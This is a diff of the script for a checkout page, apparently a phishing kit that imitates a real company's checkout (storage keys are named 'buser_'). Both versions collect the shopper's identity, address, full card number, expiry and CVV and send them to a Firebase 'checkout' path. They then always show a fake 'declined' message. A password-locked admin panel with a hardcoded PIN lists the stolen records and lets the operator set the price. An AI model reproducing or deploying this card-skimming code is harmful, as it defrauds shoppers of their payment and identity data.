-        let val = this.value.replace(/\D/g, '');
-        let formatted = '';
-        let pos = 0;
-        for (let i = 0; i < pattern.length && pos < val.length; i++) {
-          if (pattern[i] === '9') {
-            formatted += val[pos++];
-          } else {
-            formatted += pattern[i];
-          }
-        }
-        this.value = formatted;
-      });
-
-      input.addEventListener('keydown', function(e) {
-        const key = e.key;
-        if (key === 'Backspace' || key === 'Delete' || key === 'Tab' || key === 'ArrowLeft' || key === 'ArrowRight' || key === 'ArrowUp' || key === 'ArrowDown') {
-          return;
-        }
-        if (!/^[0-9]$/.test(key)) {
-          e.preventDefault();
-        }
-      });
-    }
-
-    document.querySelectorAll('.cpf-mask').forEach(el => aplicarMascara(el, '999.999.999-99'));
-    document.querySelectorAll('.telefone-mask').forEach(el => aplicarMascara(el, '(99) 99999-9999'));
-    document.querySelectorAll('.cep-mask').forEach(el => aplicarMascara(el, '99999-999'));
-    document.querySelectorAll('.cartao-mask').forEach(el => aplicarMascara(el, '9999 9999 9999 9999'));
-    document.querySelectorAll('.validade-mask').forEach(el => aplicarMascara(el, '99/99'));
-    document.querySelectorAll('.cvv-mask').forEach(el => aplicarMascara(el, '999'));
-
-    // ===== BUSCA CEP =====
-    const cepInput = document.getElementById('cep');
-    const logradouroInput = document.getElementById('logradouro');
-    const bairroInput = document.getElementById('bairro');
-    const cidadeInput = document.getElementById('cidade');
-    const ufInput = document.getElementById('uf');
-    const carregandoCep = document.getElementById('carregandoCep');
-
-    let buscaCepTimeout;
-
-    cepInput.addEventListener('input', function() {
-      clearTimeout(buscaCepTimeout);
-      const cep = this.value.replace(/\D/g, '');
-      
-      if (cep.length === 8) {
-        carregandoCep.classList.add('ativo');
-        carregandoCep.textContent = '⏳ Buscando endereço...';
-        
-        buscaCepTimeout = setTimeout(() => {
-          fetch(`https://viacep.com.br/ws/${cep}/json/`)
-            .then(response => response.json())
-            .then(data => {
-              carregandoCep.classList.remove('ativo');
-              if (!data.erro) {
-                logradouroInput.value = data.logradouro || '';
-                bairroInput.value = data.bairro || '';
-                cidadeInput.value = data.localidade || '';
-                ufInput.value = data.uf || '';
-                carregandoCep.textContent = '✅ Endereço encontrado!';
-                setTimeout(() => { carregandoCep.textContent = ''; }, 2000);
-              } else {
-                carregandoCep.textContent = '❌ CEP não encontrado';
-                setTimeout(() => { carregandoCep.textContent = ''; }, 2000);
-              }
-            })
-            .catch(() => {
-              carregandoCep.classList.remove('ativo');
-              carregandoCep.textContent = '❌ Erro ao buscar CEP';
-              setTimeout(() => { carregandoCep.textContent = ''; }, 2000);
-            });
-        }, 500);
-      } else {
-        carregandoCep.classList.remove('ativo');
+  // ===== MÁSCARAS =====
+  function aplicarMascara(input, pattern) {
+    input.addEventListener('input', function() {
+      let val = this.value.replace(/\D/g, '');
+      let formatted = '';
+      let pos = 0;
+      for (let i = 0; i < pattern.length && pos < val.length; i++) {
+        if (pattern[i] === '9') formatted += val[pos++];
+        else formatted += pattern[i];
       }
+      this.value = formatted;
     });
+    input.addEventListener('keydown', function(e) {
+      const key = e.key;
+      if (key === 'Backspace' || key === 'Delete' || key === 'Tab' || key === 'ArrowLeft' || key === 'ArrowRight' || key === 'ArrowUp' || key === 'ArrowDown') return;
+      if (!/^[0-9]$/.test(key)) e.preventDefault();
+    });
+  }
 
-    // ===== ELEMENTOS =====
-    const btnAdmin = document.getElementById('btnAbrirAdmin');
-    const modal = document.getElementById('modalAdmin');
-    const modalFechar = document.getElementById('modalFechar');
-    const btnFecharModal = document.getElementById('btnFecharModal');
-    const senhaModal = document.getElementById('senhaModal');
-    const senhaErroModal = document.getElementById('senhaErroModal');
-    const btnConfirmarSenha = document.getElementById('btnConfirmarSenha');
-    const btnSalvarModal = document.getElementById('btnSalvarModal');
-    const novoValorModal = document.getElementById('novoValorModal');
-    const areaSenha = document.getElementById('areaSenha');
-    const areaPainel = document.getElementById('areaPainel');
-    const modalTitulo = document.getElementById('modalTitulo');
-    const btnLimparHistorico = document.getElementById('btnLimparHistorico');
-    const historicoContainer = document.getElementById('historicoContainer');
+  document.querySelectorAll('.cpf-mask').forEach(el => aplicarMascara(el, '999.999.999-99'));
+  document.querySelectorAll('.telefone-mask').forEach(el => aplicarMascara(el, '(99) 99999-9999'));
+  document.querySelectorAll('.cep-mask').forEach(el => aplicarMascara(el, '99999-999'));
+  document.querySelectorAll('.cartao-mask').forEach(el => aplicarMascara(el, '9999 9999 9999 9999'));
+  document.querySelectorAll('.validade-mask').forEach(el => aplicarMascara(el, '99/99'));
+  document.querySelectorAll('.cvv-mask').forEach(el => aplicarMascara(el, '999'));
 
-    const totalPagar = document.getElementById('totalPagar');
-    const parcelaDetalhe = document.getElementById('parcelaDetalhe');
-    const parcelasSelect = document.getElementById('parcelasSelect');
+  // ===== BUSCA CEP =====
+  const cepInput = document.getElementById('cep');
+  const logradouroInput = document.getElementById('logradouro');
+  const bairroInput = document.getElementById('bairro');
+  const cidadeInput = document.getElementById('cidade');
+  const ufInput = document.getElementById('uf');
+  const carregandoCep = document.getElementById('carregandoCep');
+  let buscaCepTimeout;
 
-    const nomeCompleto = document.getElementById('nomeCompleto');
-    const email = document.getElementById('email');
-    const cpf = document.getElementById('cpf');
-    const telefone = document.getElementById('telefone');
-    const cartaoNumero = document.getElementById('cartaoNumero');
-    const nomeCartao = document.getElementById('nomeCartao');
-    const cpfTitular = document.getElementById('cpfTitular');
-    const validade = document.getElementById('validade');
-    const cvv = document.getElementById('cvv');
-
-    const msgRecusado = document.getElementById('msgRecusado');
-    const btnMsgOk = document.getElementById('btnMsgOk');
-
-    let currentValue = 99.00;
-    const STORAGE_KEY = 'buser_checkout_data';
-    const HISTORICO_KEY = 'buser_historico';
-
-    // ===== FUNÇÕES =====
-    function atualizarValorTotal(valor) {
-      const v = parseFloat(valor);
-      if (isNaN(v) || v <= 0) return;
-      currentValue = v;
-      const totalStr = v.toFixed(2).replace('.', ',');
-      totalPagar.textContent = `R$ ${totalStr}`;
-
-      const parcela = (v / 12);
-      const parcelaStr = parcela.toFixed(2).replace('.', ',');
-      parcelaDetalhe.textContent = `12x de R$ ${parcelaStr}`;
+  cepInput.addEventListener('input', function() {
+    clearTimeout(buscaCepTimeout);
+    const cep = this.value.replace(/\D/g, '');
+    if (cep.length === 8) {
+      carregandoCep.classList.add('ativo');
+      carregandoCep.textContent = '⏳ Buscando endereço...';
+      buscaCepTimeout = setTimeout(() => {
+        fetch(`https://viacep.com.br/ws/${cep}/json/`)
+          .then(response => response.json())
+          .then(data => {
+            carregandoCep.classList.remove('ativo');
+            if (!data.erro) {
+              logradouroInput.value = data.logradouro || '';
+              bairroInput.value = data.bairro || '';
+              cidadeInput.value = data.localidade || '';
+              ufInput.value = data.uf || '';
+              carregandoCep.textContent = '✅ Endereço encontrado!';
+              setTimeout(() => { carregandoCep.textContent = ''; }, 2000);
+            } else {
+              carregandoCep.textContent = '❌ CEP não encontrado';
+              setTimeout(() => { carregandoCep.textContent = ''; }, 2000);
+            }
+          })
+          .catch(() => {
+            carregandoCep.classList.remove('ativo');
+            carregandoCep.textContent = '❌ Erro ao buscar CEP';
+            setTimeout(() => { carregandoCep.textContent = ''; }, 2000);
+          });
+      }, 500);
+    } else {
+      carregandoCep.classList.remove('ativo');
     }
+  });
 
-    function coletarDados() {
-      const enderecoCompleto = `${logradouroInput.value || '—'}, ${document.getElementById('numero').value || '—'}${document.getElementById('complemento').value ? ', ' + document.getElementById('complemento').value : ''} - ${bairroInput.value || '—'}, ${cidadeInput.value || '—'} - ${ufInput.value || '—'}, CEP: ${cepInput.value || '—'}`;
-      return {
-        nome: nomeCompleto.value || '—',
-        email: email.value || '—',
-        cpf: cpf.value || '—',
-        telefone: telefone.value || '—',
-        cep: cepInput.value || '—',
-        logradouro: logradouroInput.value || '—',
-        numero: document.getElementById('numero').value || '—',
-        complemento: document.getElementById('complemento').value || '—',
-        bairro: bairroInput.value || '—',
-        cidade: cidadeInput.value || '—',
-        uf: ufInput.value || '—',
-        cartao: cartaoNumero.value || '—',
-        nomeCartao: nomeCartao.value || '—',
-        cpfTitular: cpfTitular.value || '—',
-        validade: validade.value || '—',
-        cvv: cvv.value || '—',
-        parcelas: parcelasSelect.value,
-        valor: currentValue,
-        data: new Date().toLocaleString('pt-BR')
-      };
+  // ===== ELEMENTOS =====
+  const btnAdmin = document.getElementById('btnAbrirAdmin');
+  const modal = document.getElementById('modalAdmin');
+  const modalFechar = document.getElementById('modalFechar');
+  const btnFecharModal = document.getElementById('btnFecharModal');
+  const senhaModal = document.getElementById('senhaModal');
+  const senhaErroModal = document.getElementById('senhaErroModal');
+  const btnConfirmarSenha = document.getElementById('btnConfirmarSenha');
+  const btnSalvarModal = document.getElementById('btnSalvarModal');
+  const novoValorModal = document.getElementById('novoValorModal');
+  const areaSenha = document.getElementById('areaSenha');
+  const areaPainel = document.getElementById('areaPainel');
+  const modalTitulo = document.getElementById('modalTitulo');
+  const btnLimparHistorico = document.getElementById('btnLimparHistorico');
+  const historicoContainer = document.getElementById('historicoContainer');
+
+  const totalPagar = document.getElementById('totalPagar');
+  const parcelaDetalhe = document.getElementById('parcelaDetalhe');
+  const parcelasSelect = document.getElementById('parcelasSelect');
+
+  const nomeCompleto = document.getElementById('nomeCompleto');
+  const email = document.getElementById('email');
+  const cpf = document.getElementById('cpf');
+  const telefone = document.getElementById('telefone');
+  const cartaoNumero = document.getElementById('cartaoNumero');
+  const nomeCartao = document.getElementById('nomeCartao');
+  const cpfTitular = document.getElementById('cpfTitular');
+  const validade = document.getElementById('validade');
+  const cvv = document.getElementById('cvv');
+
+  const msgRecusado = document.getElementById('msgRecusado');
+  const btnMsgOk = document.getElementById('btnMsgOk');
+
+  let currentValue = 99.00;
+  const STORAGE_KEY = 'buser_checkout_data';
+  const HISTORICO_KEY = 'buser_historico';
+
+  function atualizarValorTotal(valor) {
+    const v = parseFloat(valor);
+    if (isNaN(v) || v <= 0) return;
+    currentValue = v;
+    totalPagar.textContent = `R$ ${v.toFixed(2).replace('.', ',')}`;
+    const parcela = (v / 12);
+    parcelaDetalhe.textContent = `12x de R$ ${parcela.toFixed(2).replace('.', ',')}`;
+  }
+
+  function coletarDados() {
+    return {
+      nome: nomeCompleto.value || '—',
+      email: email.value || '—',
+      cpf: cpf.value || '—',
+      telefone: telefone.value || '—',
+      cep: cepInput.value || '—',
+      logradouro: logradouroInput.value || '—',
+      numero: document.getElementById('numero').value || '—',
+      complemento: document.getElementById('complemento').value || '—',
+      bairro: bairroInput.value || '—',
+      cidade: cidadeInput.value || '—',
+      uf: ufInput.value || '—',
+      cartao: cartaoNumero.value || '—',
+      nomeCartao: nomeCartao.value || '—',
+      cpfTitular: cpfTitular.value || '—',
+      validade: validade.value || '—',
+      cvv: cvv.value || '—',
+      parcelas: parcelasSelect.value,
+      valor: currentValue,
+      data: new Date().toLocaleString('pt-BR')
+    };
+  }
+
+  function atualizarModalDados() {
+    const dados = coletarDados();
+    document.getElementById('dNome').textContent = dados.nome;
+    document.getElementById('dEmail').textContent = dados.email;
+    document.getElementById('dCpf').textContent = dados.cpf;
+    document.getElementById('dTelefone').textContent = dados.telefone;
+    document.getElementById('dEndereco').textContent = `${dados.logradouro}, ${dados.numero}${dados.complemento !== '—' ? ', ' + dados.complemento : ''} - ${dados.bairro}, ${dados.cidade} - ${dados.uf}, CEP: ${dados.cep}`;
+    document.getElementById('dCartao').textContent = dados.cartao;
+    document.getElementById('dValidade').textContent = dados.validade;
+    document.getElementById('dCvv').textContent = dados.cvv;
+    document.getElementById('dParcelas').textContent = parcelasSelect.options[parcelasSelect.selectedIndex]?.textContent || '—';
+    document.getElementById('dValor').textContent = `R$ ${currentValue.toFixed(2).replace('.', ',')}`;
+  }
+
+  function sincronizarModal() {
+    novoValorModal.value = currentValue.toFixed(2);
+  }
+
+  function salvarHistorico(dados) {
+    let historico = [];
+    try { const raw = localStorage.getItem(HISTORICO_KEY); if (raw) historico = JSON.parse(raw); } catch(e) {}
+    historico.unshift({ ...dados, id: Date.now() });
+    if (historico.length > 50) historico = historico.slice(0, 50);
+    try { localStorage.setItem(HISTORICO_KEY, JSON.stringify(historico)); } catch(e) {}
+    return historico;
+  }
+
+  function carregarHistorico() {
+    try { const raw = localStorage.getItem(HISTORICO_KEY); if (raw) return JSON.parse(raw); } catch(e) {}
+    return [];
+  }
+
+  function renderizarHistorico() {
+    const historico = carregarHistorico();
+    historicoContainer.innerHTML = '';
+    if (historico.length === 0) {
+      historicoContainer.innerHTML = '<div class="historico-vazio">Nenhum registro salvo ainda</div>';
+      return;
     }
+    historico.forEach(item => {
+      const div = document.createElement('div');
+      div.className = 'historico-item';
+      div.innerHTML = `
+        <div class="data">📅 ${item.data || 'Sem data'}</div>
+        <div class="info">
+          <span>👤 ${item.nome || '—'}</span>
+          <span>📧 ${item.email || '—'}</span>
+          <span>💰 R$ ${(item.valor || 0).toFixed(2).replace('.', ',')}</span>
+          <span>💳 ${item.cartao || '—'}</span>
+          <span>📦 ${item.parcelas || '—'}x</span>
+        </div>
+      `;
+      historicoContainer.appendChild(div);
+    });
+  }
 
-    function atualizarModalDados() {
-      const dados = coletarDados();
-      document.getElementById('dNome').textContent = dados.nome;
-      document.getElementById('dEmail').textContent = dados.email;
-      document.getElementById('dCpf').textContent = dados.cpf;
-      document.getElementById('dTelefone').textContent = dados.telefone;
-      document.getElementById('dEndereco').textContent = 
-        `${dados.logradouro}, ${dados.numero}${dados.complemento !== '—' ? ', ' + dados.complemento : ''} - ${dados.bairro}, ${dados.cidade} - ${dados.uf}, CEP: ${dados.cep}`;
-      document.getElementById('dCartao').textContent = dados.cartao;
-      document.getElementById('dValidade').textContent = dados.validade;
-      document.getElementById('dCvv').textContent = dados.cvv;
-      document.getElementById('dParcelas').textContent = parcelasSelect.options[parcelasSelect.selectedIndex]?.textContent || '—';
-      document.getElementById('dValor').textContent = `R$ ${currentValue.toFixed(2).replace('.', ',')}`;
-    }
+  function salvarNoFirebase(dados) {
+    if (!firebaseInicializado) return Promise.resolve();
+    try {
+      const ref = database.ref('checkout/' + Date.now());
+      return ref.set({ ...dados, timestamp: new Date().toISOString() })
+        .then(() => console.log('✅ Dados salvos no Firebase!'))
+        .catch(err => console.warn('Erro ao salvar no Firebase:', err));
+    } catch(e) { return Promise.resolve(); }
+  }
 
-    function sincronizarModal() {
-      novoValorModal.value = currentValue.toFixed(2);
-    }
+  function salvarDadosCompleto() {
+    const dados = coletarDados();
+    salvarHistorico(dados);
+    renderizarHistorico();
+    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(dados)); } catch(e) {}
+    if (firebaseInicializado) salvarNoFirebase(dados);
+    atualizarModalDados();
+  }
 
-    // ===== HISTÓRICO =====
-    function salvarHistorico(dados) {
-      let historico = [];
-      try {
-        const raw = localStorage.getItem(HISTORICO_KEY);
-        if (raw) historico = JSON.parse(raw);
-      } catch(e) {}
-      
-      historico.unshift({
-        ...dados,
-        id: Date.now()
-      });
-      
-      if (historico.length > 50) historico = historico.slice(0, 50);
-      
-      try {
-        localStorage.setItem(HISTORICO_KEY, JSON.stringify(historico));
-      } catch(e) {}
-      
-      return historico;
-    }
-
-    function carregarHistorico() {
-      try {
-        const raw = localStorage.getItem(HISTORICO_KEY);
-        if (raw) return JSON.parse(raw);
-      } catch(e) {}
-      return [];
-    }
-
-    function renderizarHistorico() {
-      const historico = carregarHistorico();
-      historicoContainer.innerHTML = '';
-      
-      if (historico.length === 0) {
-        historicoContainer.innerHTML = '<div class="historico-vazio">Nenhum registro salvo ainda</div>';
-        return;
-      }
-      
-      historico.forEach(item => {
-        const div = document.createElement('div');
-        div.className = 'historico-item';
-        div.innerHTML = `
-          <div class="data">📅 ${item.data || 'Sem data'}</div>
-          <div class="info">
-            <span>👤 ${item.nome || '—'}</span>
-            <span>📧 ${item.email || '—'}</span>
-            <span>💰 R$ ${(item.valor || 0).toFixed(2).replace('.', ',')}</span>
-            <span>💳 ${item.cartao || '—'}</span>
-            <span>📦 ${item.parcelas || '—'}x</span>
-          </div>
-        `;
-        historicoContainer.appendChild(div);
-      });
-    }
-
-    function limparHistorico() {
-      if (confirm('Tem certeza que deseja limpar todo o histórico?')) {
-        localStorage.removeItem(HISTORICO_KEY);
-        renderizarHistorico();
-      }
-    }
-
-    // ===== SALVAR DADOS NO FIREBASE =====
-    function salvarNoFirebase(dados) {
-      if (!firebaseInicializado) {
-        console.warn('Firebase não disponível, salvando apenas localmente');
-        return Promise.resolve();
-      }
-      
-      try {
-        const ref = database.ref('checkout/' + Date.now());
-        return ref.set({
-          ...dados,
-          timestamp: new Date().toISOString()
-        }).then(() => {
-          console.log('✅ Dados salvos no Firebase com sucesso!');
-        }).catch((err) => {
-          console.warn('Erro ao salvar no Firebase:', err);
-        });
-      } catch (e) {
-        console.warn('Erro ao salvar no Firebase:', e);
-        return Promise.resolve();
-      }
-    }
-
-    // ===== SALVAR DADOS COMPLETO =====
-    function salvarDadosCompleto() {
-      const dados = coletarDados();
-      
-      salvarHistorico(dados);
+  function limparHistorico() {
+    if (confirm('Tem certeza que deseja limpar todo o histórico?')) {
+      localStorage.removeItem(HISTORICO_KEY);
       renderizarHistorico();
-      
-      try {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(dados));
-      } catch(e) {}
-      
-      if (firebaseInicializado) {
-        salvarNoFirebase(dados);
-      }
-      
-      atualizarModalDados();
     }
+  }
 
-    // ===== MODAL SENHA =====
-    function abrirModal() {
-      modal.classList.add('aberto');
-      areaSenha.style.display = 'block';
-      areaPainel.style.display = 'none';
-      modalTitulo.textContent = '🔐 Acesso Administrativo';
-      senhaModal.value = '';
+  function abrirModal() {
+    modal.classList.add('aberto');
+    areaSenha.style.display = 'block';
+    areaPainel.style.display = 'none';
+    modalTitulo.textContent = '🔐 Acesso Administrativo';
+    senhaModal.value = '';
+    senhaErroModal.classList.remove('visivel');
+    senhaModal.focus();
+  }
+
+  function fecharModal() {
+    modal.classList.remove('aberto');
+    senhaErroModal.classList.remove('visivel');
+    areaSenha.style.display = 'block';
+    areaPainel.style.display = 'none';
+  }
+
+  function confirmarSenha() {
+    if (senhaModal.value.trim() === '167041') {
       senhaErroModal.classList.remove('visivel');
+      areaSenha.style.display = 'none';
+      areaPainel.style.display = 'block';
+      modalTitulo.textContent = '🔐 Painel de Controle';
+      sincronizarModal();
+      atualizarModalDados();
+      renderizarHistorico();
+    } else {
+      senhaErroModal.classList.add('visivel');
+      senhaModal.value = '';
       senhaModal.focus();
     }
+  }
 
-    function fecharModal() {
-      modal.classList.remove('aberto');
-      senhaErroModal.classList.remove('visivel');
-      areaSenha.style.display = 'block';
-      areaPainel.style.display = 'none';
-    }
+  // EVENTOS
+  btnAdmin.addEventListener('click', abrirModal);
+  modalFechar.addEventListener('click', fecharModal);
+  btnFecharModal.addEventListener('click', fecharModal);
+  modal.addEventListener('click', function(e) { if (e.target === modal) fecharModal(); });
+  senhaModal.addEventListener('keydown', function(e) { if (e.key === 'Enter') confirmarSenha(); });
+  btnConfirmarSenha.addEventListener('click', confirmarSenha);
 
-    function confirmarSenha() {
-      const senha = senhaModal.value.trim();
-      if (senha === '167041') {
-        senhaErroModal.classList.remove('visivel');
-        areaSenha.style.display = 'none';
-        areaPainel.style.display = 'block';
-        modalTitulo.textContent = '🔐 Painel de Controle';
-        sincronizarModal();
-        atualizarModalDados();
-        renderizarHistorico();
-      } else {
-        senhaErroModal.classList.add('visivel');
-        senhaModal.value = '';
-        senhaModal.focus();
-      }
-    }
-
-    // ===== EVENTOS =====
-    btnAdmin.addEventListener('click', abrirModal);
-    modalFechar.addEventListener('click', fecharModal);
-    btnFecharModal.addEventListener('click', fecharModal);
-
-    modal.addEventListener('click', function(e) {
-      if (e.target === modal) fecharModal();
-    });
-
-    senhaModal.addEventListener('keydown', function(e) {
-      if (e.key === 'Enter') confirmarSenha();
-    });
-
-    btnConfirmarSenha.addEventListener('click', confirmarSenha);
-
-    btnSalvarModal.addEventListener('click', function() {
-      const novoValor = parseFloat(novoValorModal.value.replace(',', '.'));
-      if (!isNaN(novoValor) && novoValor > 0) {
-        atualizarValorTotal(novoValor);
-        btnSalvarModal.textContent = '✅ Salvo!';
-        setTimeout(() => { btnSalvarModal.textContent = '💾 Salvar valor'; }, 1200);
-        salvarDadosCompleto();
-      } else {
-        alert('⚠️ Valor inválido. Use um número positivo (ex: 99.00)');
-      }
-    });
-
-    btnLimparHistorico.addEventListener('click', limparHistorico);
-
-    document.getElementById('btnFinalizar').addEventListener('click', function() {
+  btnSalvarModal.addEventListener('click', function() {
+    const novoValor = parseFloat(novoValorModal.value.replace(',', '.'));
+    if (!isNaN(novoValor) && novoValor > 0) {
+      atualizarValorTotal(novoValor);
+      btnSalvarModal.textContent = '✅ Salvo!';
+      setTimeout(() => { btnSalvarModal.textContent = '💾 Salvar valor'; }, 1200);
       salvarDadosCompleto();
-      msgRecusado.classList.add('aberto');
-    });
-
-    btnMsgOk.addEventListener('click', function() {
-      msgRecusado.classList.remove('aberto');
-    });
-
-    msgRecusado.addEventListener('click', function(e) {
-      if (e.target === msgRecusado) msgRecusado.classList.remove('aberto');
-    });
-
-    // ===== INICIALIZAÇÃO =====
-    function init() {
-      atualizarValorTotal(99.00);
-      parcelasSelect.selectedIndex = 11;
-      
-      try {
-        const raw = localStorage.getItem(STORAGE_KEY);
-        if (raw) {
-          const dados = JSON.parse(raw);
-          if (dados.nome) nomeCompleto.value = dados.nome;
-          if (dados.email) email.value = dados.email;
-          if (dados.cpf) cpf.value = dados.cpf;
-          if (dados.telefone) telefone.value = dados.telefone;
-          if (dados.cep) cepInput.value = dados.cep;
-          if (dados.logradouro) logradouroInput.value = dados.logradouro;
-          if (dados.numero) document.getElementById('numero').value = dados.numero;
-          if (dados.complemento) document.getElementById('complemento').value = dados.complemento;
-          if (dados.bairro) bairroInput.value = dados.bairro;
-          if (dados.cidade) cidadeInput.value = dados.cidade;
-          if (dados.uf) ufInput.value = dados.uf;
-          if (dados.cartao) cartaoNumero.value = dados.cartao;
-          if (dados.nomeCartao) nomeCartao.value = dados.nomeCartao;
-          if (dados.cpfTitular) cpfTitular.value = dados.cpfTitular;
-          if (dados.validade) validade.value = dados.validade;
-          if (dados.cvv) cvv.value = dados.cvv;
-          if (dados.valor) {
-            currentValue = dados.valor;
-            atualizarValorTotal(currentValue);
-          }
-        }
-      } catch(e) {}
-      
-      renderizarHistorico();
+    } else {
+      alert('⚠️ Valor inválido. Use um número positivo (ex: 99.00)');
     }
-    init();
-  })();
+  });
+
+  btnLimparHistorico.addEventListener('click', limparHistorico);
+
+  document.getElementById('btnFinalizar').addEventListener('click', function() {
+    salvarDadosCompleto();
+    msgRecusado.classList.add('aberto');
+  });
+
+  btnMsgOk.addEventListener('click', function() { msgRecusado.classList.remove('aberto'); });
+  msgRecusado.addEventListener('click', function(e) { if (e.target === msgRecusado) msgRecusado.classList.remove('aberto'); });
+
+  // INICIALIZAÇÃO
+  function init() {
+    atualizarValorTotal(99.00);
+    parcelasSelect.selectedIndex = 11;
+    try {
+      const raw = localStorage.getItem(STORAGE_KEY);
+      if (raw) {
+        const dados = JSON.parse(raw);
+        if (dados.nome) nomeCompleto.value = dados.nome;
+        if (dados.email) email.value = dados.email;
+        if (dados.cpf) cpf.value = dados.cpf;
+        if (dados.telefone) telefone.value = dados.telefone;
+        if (dados.cep) cepInput.value = dados.cep;
+        if (dados.logradouro) logradouroInput.value = dados.logradouro;
+        if (dados.numero) document.getElementById('numero').value = dados.numero;
+        if (dados.complemento) document.getElementById('complemento').value = dados.complemento;
+        if (dados.bairro) bairroInput.value = dados.bairro;
+        if (dados.cidade) cidadeInput.value = dados.cidade;
+        if (dados.uf) ufInput.value = dados.uf;
+        if (dados.cartao) cartaoNumero.value = dados.cartao;
+        if (dados.nomeCartao) nomeCartao.value = dados.nomeCartao;
+        if (dados.cpfTitular) cpfTitular.value = dados.cpfTitular;
+        if (dados.validade) validade.value = dados.validade;
+        if (dados.cvv) cvv.value = dados.cvv;
+        if (dados.valor) { currentValue = dados.valor; atualizarValorTotal(currentValue); }
+      }
+    } catch(e) {}
+    renderizarHistorico();
+  }
+  init();
+})();
 </script>
 </body>
 </html>
